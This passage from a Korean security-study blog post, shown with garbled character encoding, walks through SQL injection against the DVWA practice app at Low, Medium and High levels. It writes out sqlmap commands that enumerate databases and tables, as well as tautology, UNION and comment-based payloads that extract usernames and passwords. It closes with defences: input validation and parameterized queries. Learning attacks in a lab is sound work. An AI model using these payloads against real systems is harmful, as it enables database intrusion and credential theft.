> **ì•ì„œ ìš°ë¦¬ê°€ ì§ì ‘ í•˜ë‚˜ì”© ëŒ€ì…í•˜ë©° ê³µê²©í•˜ëŠ” ê²ƒì„ SQLMAP í”„ë¡œê·¸ë¨ì„ í†µí•´ ìë™í™”í•˜ì—¬ í•œë²ˆì— ê³µê²©**í•  ìˆ˜ ìˆëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126738994-6e634a04-97d9-4add-8d82-f7ae9efde8f8.png)

ë‹¤ìŒì€ ì—¬ëŸ¬ ì˜µì…˜ ëª…ë ¹ì–´ë“¤ì„ ì‚´í´ë³´ì! ğŸ™‹ğŸ½ğŸ™‹ğŸ½

#### - í˜„ì¬ DB ì´ë¦„ ì•Œì•„ë‚´ê¸°

~~~sql
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=m6tod3hikjqo1u1pkm9973e6e0" --current-db
~~~

í˜„ì¬ DB ì´ë¦„ì´ dvwaë¼ëŠ” ê²ƒ í™•ì¸!

![image](https://user-images.githubusercontent.com/53431568/126739370-20399d1a-8c59-4857-9c4d-f168a10d4dc4.png)

#### - í…Œì´ë¸” ì´ë¦„ ì•Œì•„ë‚´ê¸°

í˜„ì¬ DB ì´ë¦„ì„ ë„£ì–´ì„œ ê·¸ DBì˜ í…Œì´ë¸” ì´ë¦„ì„ ì•Œì•„ë‚¸ë‹¤.

~~~sql
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=m6tod3hikjqo1u1pkm9973e6e0" -D dvwa --table
~~~

ì¶œë ¥í™”ë©´

![image](https://user-images.githubusercontent.com/53431568/126739579-4f4e789b-6474-4b4e-aaf2-faee5e55d3bc.png)




<br><br>


### (4) Medium ë‹¨ê³„ 

ë¯¸ë””ì—„ ë‹¨ê³„ì—ì„œëŠ” ì§ì ‘ì…ë ¥ì´ ì•„ë‹Œ ê°’ì„ ì„ íƒí•´ì•¼í•˜ëŠ” ê²ƒìœ¼ë¡œ ì„¤ì •í•´ë‘ì—ˆë‹¤. ì´ëŸ´ë• intercept ê¸°ëŠ¥ìœ¼ë¡œ ê°’ì„ ë°”ê¾¸ëŠ” ê²ƒì„ ì‹œë„í•´ë³¼ ìˆ˜ ìˆë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126739913-0427d1bc-daa8-4154-a47f-2997534277c2.png)

ë¨¼ì €, burpsuiteë¥¼ ì¼œì„œ `intercept is on`ìœ¼ë¡œ ì„¤ì •í•´ì¤€ë‹¤.

ê·¸ë¦¬ê³  ë‹¤ìŒê³¼ ê°™ì´ idë¥¼ 1ë¡œ submit í•œ í›„, ê°’ì„ 1'or'1='1ë¡œ ë³€ê²½í•´ì¤€ë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126740240-240320f7-2ea7-47d5-bbfc-0818315406c5.png)

forward í›„ ì—ëŸ¬ê°€ ë‚œ ê²ƒì„ í™•ì¸!! ë¬´ì—‡ì´ ë¬¸ì œì¼ê¹Œ? ì†ŒìŠ¤ì½”ë“œë¥¼ ë³´ì

![image](https://user-images.githubusercontent.com/53431568/126740264-90a4a84a-8338-4ae3-9a9a-a8863bd5c56b.png)

ì†ŒìŠ¤ì½”ë“œë¥¼ ë³´ë©´ low ë‹¨ê³„ì™€ëŠ” ë‹¬ë¦¬ ì‘ì€ë”°ì˜´í‘œê°€ ì—†ëŠ” ê²ƒì„ í™•ì¸ í•  ìˆ˜ ìˆë‹¤. ì´ ë§ì€ id ê°’ìœ¼ë¡œëŠ” ë”ì´ìƒ ë¬¸ìì—´ì´ ì•„ë‹ˆê¸° ë•Œë¬¸ì— ìˆ«ì ê°’ë§Œ ë‚˜ì™€ì•¼ í•œë‹¤ëŠ” ê²ƒì´ë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126740300-d9c3b9e0-8df0-433e-abff-da9fca8381ec.png)

ê·¸ëŸ¼ ë‹¤ì‹œ interceptë¥¼ í†µí•´ì„œ or 1=1 ê°’ì„ ë„£ì–´ì¤€ë‹¤. (âš ï¸ë„ì–´ì“°ê¸° ì£¼ì˜!)

![image](https://user-images.githubusercontent.com/53431568/126740414-e0f2c3df-1419-4387-8db2-361f3aa67da1.png)

forward í›„! ê³µê²©ì— ì„±ê³µí–ˆë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126740439-fcfae1e3-2ac1-4918-86ce-25867a63d7ca.png)

<br><br>

ì´ë²ˆì—” union ê³µê²©ë„ ì„±ê³µí• ì§€ ì•Œì•„ë³´ì, ë‹¤ì‹œ intercept í›„ idì˜ 1 ë’¤ì— `union select user,password from users#` ì…ë ¥

![image](https://user-images.githubusercontent.com/53431568/126740562-bef78c37-3194-41b9-b599-1f4aae3f5aa8.png)

forward ì„±ê³µ!

![image](https://user-images.githubusercontent.com/53431568/126740608-b2141256-a2f1-47e4-966c-f793a2070407.png)


<br><br>


### (5) High ë‹¨ê³„ 

high ë‹¨ê³„ì—ì„œëŠ” ìƒˆë¡œìš´ ì°½ì—ì„œ ì…ë ¥í•˜ë„ë¡ ë°”ë€Œì—ˆë‹¤.

![image](https://user-images.githubusercontent.com/53431568/126740679-d205e3b7-0fd5-47be-9afe-a14311f13395.png)

ì†ŒìŠ¤ì½”ë“œë¥¼ ë³´ë©´ LIMITì´ë¼ëŠ” í‚¤ì›Œë“œë¥¼ ì‚¬ìš©í•´ ì¶œë ¥ë˜ëŠ” ë ˆì½”ë“œ ìˆ˜ë¥¼ ì œí•œí•˜ê³  ìˆë‹¤. LIMIT 1 ì¸ ê²ƒì€ í•˜ë‚˜ë§Œ ì¶œë ¥í•˜ë¼ëŠ” ëœ»! 

ê³µê²©ì„ í•˜ë ¤ë©´.. id ë’¤ì— ì£¼ì„ì²˜ë¦¬ë©´ í•˜ë©´ LIMITëŠ” ì ìš©ë˜ì§€ ì•Šê¸° ë•Œë¬¸ì— ë¬´ìš©ì§€ë¬¼ì´ ëœë‹¤... ì¡°í¼ í—ˆì ‘í•œê±¸..?

![image](https://user-images.githubusercontent.com/53431568/126740822-ae5931e3-7f7a-44e4-bccd-22551939ba75.png)

ì´ëŸ°ì‹ìœ¼ë¡œ ë’¤ì— # ë§Œ ë¶™ì´ë©´ ê³µê²© ì„±ê³µ! ë‹¤ì‹œ ë§í•˜ì§€ë§Œ ì¢€.. í—ˆì ‘ì“°.. HIGH ë§ì•„?

![image](https://user-images.githubusercontent.com/53431568/126740877-06961827-fd2e-4564-82e6-88f995eff555.png)



<br><br>

### SQLì¸ì ì…˜ ê³µê²© ëŒ€ì‘ ğŸ‘¨â€ğŸ«

impossible ë‹¨ê³„ì˜ ì†ŒìŠ¤ì½”ë“œë¥¼ ë³´ë©´ì„œ ì•Œì•„ë³´ì

![image](https://user-images.githubusercontent.com/53431568/126741096-b763f58f-919d-40d0-91c7-eee003d3786d.png)


#### âš ï¸ ëŒ€ì‘ì„ ìœ„í•œ ë‘ê°€ì§€ ì¤‘ìš”ì‚¬í•­

> 1. **ì…ë ¥ê°’ì„ ì œëŒ€ë¡œ ê²€ì¦í•œë‹¤.** ì†ŒìŠ¤ì½”ë“œì—ì„œì²˜ëŸ¼ idê°€ ìˆ«ìì¸ì§€ í™•ì¸ì„ í•œë‹¤. í•„ìš”í•œ ë°ì´í„° í˜•ì‹ì„ ì •í™•íˆ ê²€ì‚¬í•˜ê²Œ ëœë‹¤. 
> 2. **ë™ì  ì¿¼ë¦¬ê°€ ì•„ë‹Œ íŒŒë¼ë¯¸í„° ì¿¼ë¦¬ ì‚¬ìš©!** íŒŒë¼ë¯¸í„° ì¿¼ë¦¬ë¥¼ ì‚¬ìš©í•´ ì‚¬ìš©ìê°€ ë¯¸ë¦¬ ì¿¼ë¦¬ë¬¸ í˜•ì‹ì„ ì‘ì„±í•˜ê³  id ë¶€ë¶„ë§Œ í™•ì¸ì„ í•˜ê²Œ ë˜ì–´ ì–´ë–¤ê²ƒì´ ì½”ë“œì´ê³  ì–´ë–¤ê²ƒì´ ë°ì´í„°ì¸ì§€ ì•Œê³ ìˆì–´ SQLì¿¼ë¦¬ë¬¸ì„ ì¡°ì‘í•˜ì§€ ëª»í•˜ê²Œ ë§‰ì•„ SQLì¸ì ì…˜ ê³µê²©ì„ ë§‰ì„ ìˆ˜ ìˆë‹¤.



<br><br>

#### ì´ë¯¸ì§€ ì¶œì²˜
  
[https://edu.goorm.io/lecture/4953/í™”ì´íŠ¸í•´ì»¤ê°€-ë˜ê¸°-ìœ„í•œ-8ê°€ì§€-ì›¹-í•´í‚¹-ê¸°ìˆ ](https://edu.goorm.io/lecture/4953/í™”ì´íŠ¸í•´ì»¤ê°€-ë˜ê¸°-ìœ„í•œ-8ê°€ì§€-ì›¹-í•´í‚¹-ê¸°ìˆ )
  





